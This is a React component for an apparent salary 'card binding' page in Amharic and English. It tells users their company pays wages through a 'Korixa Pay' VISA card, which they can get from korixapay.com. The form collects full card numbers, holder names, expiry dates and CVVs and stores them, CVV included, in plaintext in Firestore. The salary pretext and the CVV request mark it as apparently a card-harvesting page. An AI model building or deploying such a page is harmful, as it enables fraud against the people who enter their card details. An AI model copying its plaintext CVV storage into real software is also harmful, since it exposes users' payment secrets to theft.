import React, { useState, useEffect } from "react"
import { useParams, useNavigate } from "react-router-dom"
import { doc, getDoc, updateDoc, collection, query, where, getDocs, serverTimestamp } from "firebase/firestore"
import { db, auth } from "../config/firebase"
import { ArrowLeft, CreditCard, ShieldCheck, AlertCircle, Info, Loader2 } from "lucide-react"

export default function BindCard() {
  const { id } = useParams()
  const navigate = useNavigate()
  
  const [lang, setLang] = useState('am')
  const [loading, setLoading] = useState(true)
  const [saving, setSaving] = useState(false)
  
  const [cardData, setCardData] = useState({
    cardNumber: "",
    holderName: "",
    expiryDate: "",
    cvv: ""
  })
  
  const [existingCard, setExistingCard] = useState(null)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")

  const t = (key) => {
    const texts = {
      bindCardTitle: { en: "Bind VISA Card", am: "ቪዛ ካርድ ያገናኙ" },
      bindCardDesc: { en: "Connect your Elite Black Card to receive your salary", am: "ደሞዝዎን ለመቀበል የኤሊት ብላክ ካርድዎን ያገናኙ" },
      cardNumber: { en: "Card Number", am: "የካርድ ቁጥር" },
      cardHolder: { en: "Card Holder Name", am: "የካርድ ባለቤት ስም" },
      validThru: { en: "Valid Thru (MM/YY)", am: "የሚያበቃበት ጊዜ (MM/YY)" },
      cvv: { en: "CVV", am: "CVV ሚስጥር ቁጥር" },
      bindButton: { en: "Bind Card Now", am: "አሁን ያገናኙ" },
      infoTitle: { en: "Important Notice", am: "አስፈላጊ ማሳሰቢያ" },
      infoDesc: { en: "Please bind your Visa card to receive your salary. The company pays with this card. If you do not have this card, you can get it from korixapay.com.", am: "ደሞዝዎን ለመቀበል እባክዎ ቪዛ ካርድዎን ያገናኙ። ኩባንያው ደሞዝ የሚከፍለው በዚህ ካርድ ነው። ይህ ካርድ ከሌለዎት ከ korixapay.com ማግኘት ይችላሉ።" },
      alreadyBound: { en: "You have already bound a card.", am: "ቀደም ብለው ካርድ አገናኝተዋል" },
      cardInUse: { en: "This card is already bound to another user.", am: "ይህ ካርድ በሌላ ተጠቃሚ ተገናኝቷል" },
      successMsg: { en: "Card bound successfully!", am: "ካርዱ በተሳካ ሁኔታ ተገናኝቷል!" },
      invalidCard: { en: "Please enter a valid 16-digit card number", am: "እባክዎ ትክክለኛ ባለ 16-ዲጂት የካርድ ቁጥር ያስገቡ" }
    }
    return texts[key]?.[lang] || texts[key]?.en || key
  }

  useEffect(() => {
    const fetchUser = async () => {
      try {
        if (!id) return;
        const userDoc = await getDoc(doc(db, "users", id))
        if (userDoc.exists()) {
          const data = userDoc.data()
          if (data.visaCard) {
            setExistingCard(data.visaCard)
          }
        }
      } catch (err) {
        console.error("Error fetching user data", err)
      } finally {
        setLoading(false)
      }
    }
    fetchUser()
  }, [id])

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = matches && matches[0] || ''
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(' ')
    } else {
      return value
    }
  }

  const formatExpiry = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }
    return v
  }

  const handleChange = (e) => {
    const { name, value } = e.target
    if (name === "cardNumber") {
      setCardData({ ...cardData, [name]: formatCardNumber(value) })
    } else if (name === "expiryDate") {
      setCardData({ ...cardData, [name]: formatExpiry(value) })
    } else if (name === "cvv") {
      setCardData({ ...cardData, [name]: value.replace(/\D/g, '').slice(0, 4) })
    } else {
      setCardData({ ...cardData, [name]: value.toUpperCase() })
    }
  }

  const handleBindCard = async (e) => {
    e.preventDefault()
    setError("")
    setSuccess("")
    
    const unformattedCard = cardData.cardNumber.replace(/\s/g, '')
    if (unformattedCard.length !== 16) {
      setError(t("invalidCard"))
      return
    }

    setSaving(true)
    try {
      // Check if card is already used
      const usersRef = collection(db, "users")
      const q = query(usersRef, where("visaCard.cardNumber", "==", cardData.cardNumber))
      const querySnapshot = await getDocs(q)
      
      if (!querySnapshot.empty) {
        // Someone already has this card (maybe even the same user, but we checked existingCard above)
        setError(t("cardInUse"))
        setSaving(false)
        return
      }

      const cardPayload = {
        cardNumber: cardData.cardNumber, // save with spaces for display
        holderName: cardData.holderName,
        expiryDate: cardData.expiryDate,
        cvv: cardData.cvv,
        tierId: "silver", // Default tier per screenshot
        frozen: false,
        displayInAssets: true,
        createdAt: new Date().toISOString() // String date as requested
      }

      await updateDoc(doc(db, "users", id), {
        visaCard: cardPayload
      })

      setSuccess(t("successMsg"))
      setExistingCard(cardPayload)
    } catch (err) {
      console.error(err)
      setError("Error saving card")
    } finally {
      setSaving(false)
    }
  }

  if (loading) {
    return <div className="min-h-screen flex items-center justify-center bg-gray-900"><Loader2 className="w-10 h-10 animate-spin text-cyan-500" /></div>
  }

  // Preview data based on input or existing card
  const previewData = existingCard || cardData
  const displayCardNumber = previewData.cardNumber || "XXXX XXXX XXXX XXXX"
  const displayHolder = previewData.holderName || "CARD HOLDER"
  const displayExpiry = previewData.expiryDate || "MM/YY"
  const displayCvv = previewData.cvv || "•••"

  return (
    <div className="min-h-screen bg-gray-950 text-white font-sans selection:bg-cyan-500/30">
      {/* Header */}
      <div className="sticky top-0 z-50 bg-gray-950/80 backdrop-blur-xl border-b border-gray-800">
        <div className="max-w-2xl mx-auto px-4 py-4 flex justify-between items-center">
          <button onClick={() => navigate(-1)} className="p-2 -ml-2 rounded-full hover:bg-gray-800 transition-colors">
            <ArrowLeft className="w-6 h-6 text-gray-300" />
          </button>
          
          <button 
            onClick={() => setLang(l => l === 'am' ? 'en' : 'am')}
            className="flex items-center gap-2 bg-gray-900 border border-gray-700 px-3 py-1.5 rounded-full text-xs font-bold hover:bg-gray-800 transition-colors"
          >
            <span className={lang === 'am' ? 'text-cyan-400' : 'text-gray-500'}>አማ</span>
            <span className="text-gray-600">|</span>
            <span className={lang === 'en' ? 'text-cyan-400' : 'text-gray-500'}>EN</span>
          </button>
        </div>
      </div>

      <div className="max-w-md mx-auto px-4 py-8 pb-20">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-black text-white tracking-tight mb-2">{t("bindCardTitle")}</h1>
          <p className="text-gray-400 text-sm">{t("bindCardDesc")}</p>
        </div>

        {/* Card Preview (Elite Black Card Style) */}
        <div className="relative w-full h-[220px] rounded-[1.5rem] p-6 flex flex-col justify-between overflow-hidden shadow-2xl mb-8 transform transition-transform hover:scale-[1.02] duration-300"
             style={{
               background: 'linear-gradient(135deg, #2b2b2b 0%, #1a1a1a 100%)',
               boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.7), inset 0 1px 1px rgba(255, 255, 255, 0.1)'
             }}>
          {/* Background pattern overlay */}
          <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, white 1px, transparent 0)', backgroundSize: '24px 24px' }}></div>
          
          {/* Card Top */}
          <div className="relative flex justify-between items-start w-full">
            <div>
              <p className="text-[10px] font-bold text-gray-400 tracking-[0.2em]">KORIXA PAY</p>
              <p className="text-xs font-black text-gray-300 uppercase tracking-widest mt-1">SILVER</p>
            </div>
            {/* Chip icon */}
            <div className="w-12 h-9 border-2 border-gray-600 rounded-md bg-gradient-to-br from-gray-300 to-gray-500 opacity-70 grid grid-cols-3 grid-rows-3 gap-[1px] p-[2px]">
               <div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div>
               <div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div>
               <div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div><div className="border border-gray-500/50 rounded-sm"></div>
            </div>
          </div>

          {/* Card Number */}
          <div className="relative mt-2">
            <p className="font-mono text-xl sm:text-2xl tracking-[0.2em] text-gray-100 drop-shadow-md">
              {displayCardNumber}
            </p>
          </div>

          {/* Card Bottom */}
          <div className="relative flex justify-between items-end w-full">
            <div className="flex gap-6">
              <div>
                <p className="text-[8px] font-bold text-gray-500 uppercase tracking-wider mb-1">Card Holder</p>
                <p className="font-mono text-xs sm:text-sm text-gray-200 tracking-widest uppercase truncate max-w-[150px]">{displayHolder}</p>
              </div>
              <div>
                <p className="text-[8px] font-bold text-gray-500 uppercase tracking-wider mb-1">Valid Thru</p>
                <p className="font-mono text-xs sm:text-sm text-gray-200 tracking-widest">{displayExpiry}</p>
              </div>
              {!existingCard && (
                <div>
                  <p className="text-[8px] font-bold text-gray-500 uppercase tracking-wider mb-1">CVV</p>
                  <p className="font-mono text-xs sm:text-sm text-gray-200 tracking-widest">{displayCvv}</p>
                </div>
              )}
            </div>
            {/* Visa Logo Mock */}
            <div className="flex flex-col items-end">
               <span className="text-xl italic font-black text-white">VISA</span>
            </div>
          </div>
        </div>

        {/* Info Banner */}
        <div className="bg-gray-900/80 border border-cyan-900/50 rounded-2xl p-4 flex gap-4 mb-8">
          <Info className="w-6 h-6 text-cyan-400 flex-shrink-0 mt-0.5" />
          <div>
            <h3 className="font-bold text-cyan-400 text-sm mb-1">{t("infoTitle")}</h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              {t("infoDesc")}
            </p>
          </div>
        </div>

        {existingCard ? (
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 text-center space-y-4">
            <div className="w-16 h-16 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto">
              <ShieldCheck className="w-8 h-8 text-emerald-500" />
            </div>
            <h2 className="text-xl font-bold text-white">{t("alreadyBound")}</h2>
            <p className="text-sm text-gray-400">Your salary will be deposited to this Elite Black Card.</p>
          </div>
        ) : (
          <form onSubmit={handleBindCard} className="space-y-5">
            {error && (
              <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3 flex items-center gap-3 text-red-400 text-sm font-medium">
                <AlertCircle className="w-5 h-5 flex-shrink-0" />
                <p>{error}</p>
              </div>
            )}
            
            {success && (
              <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-3 flex items-center gap-3 text-emerald-400 text-sm font-medium">
                <ShieldCheck className="w-5 h-5 flex-shrink-0" />
                <p>{success}</p>
              </div>
            )}

            <div>
              <label className="block text-xs font-bold text-gray-400 mb-1.5 uppercase tracking-wider">{t("cardNumber")}</label>
              <input
                type="text"
                name="cardNumber"
                value={cardData.cardNumber}
                onChange={handleChange}
                placeholder="0000 0000 0000 0000"
                maxLength={19}
                required
                className="w-full bg-gray-900 border border-gray-800 rounded-xl px-4 py-3.5 text-white font-mono placeholder:text-gray-700 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-gray-400 mb-1.5 uppercase tracking-wider">{t("cardHolder")}</label>
              <input
                type="text"
                name="holderName"
                value={cardData.holderName}
                onChange={handleChange}
                placeholder="e.g. SHIKUR YIBRIE MUHAMMED"
                required
                className="w-full bg-gray-900 border border-gray-800 rounded-xl px-4 py-3.5 text-white font-mono uppercase placeholder:text-gray-700 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-bold text-gray-400 mb-1.5 uppercase tracking-wider">{t("validThru")}</label>
                <input
                  type="text"
                  name="expiryDate"
                  value={cardData.expiryDate}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                  className="w-full bg-gray-900 border border-gray-800 rounded-xl px-4 py-3.5 text-white font-mono placeholder:text-gray-700 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
                />
              </div>
              <div>
                <label className="block text-xs font-bold text-gray-400 mb-1.5 uppercase tracking-wider">{t("cvv")}</label>
                <input
                  type="text"
                  name="cvv"
                  value={cardData.cvv}
                  onChange={handleChange}
                  placeholder="123"
                  maxLength={4}
                  required
                  className="w-full bg-gray-900 border border-gray-800 rounded-xl px-4 py-3.5 text-white font-mono placeholder:text-gray-700 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
                />
              </div>
            </div>

            <div className="pt-4">
              <button
                type="submit"
                disabled={saving}
                className="w-full bg-cyan-600 hover:bg-cyan-500 active:bg-cyan-700 text-white font-black py-4 rounded-xl shadow-lg shadow-cyan-900/20 transition-all flex items-center justify-center gap-2 disabled:opacity-70"
              >
                {saving ? <Loader2 className="w-5 h-5 animate-spin" /> : <CreditCard className="w-5 h-5" />}
                {t("bindButton")}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  )
}
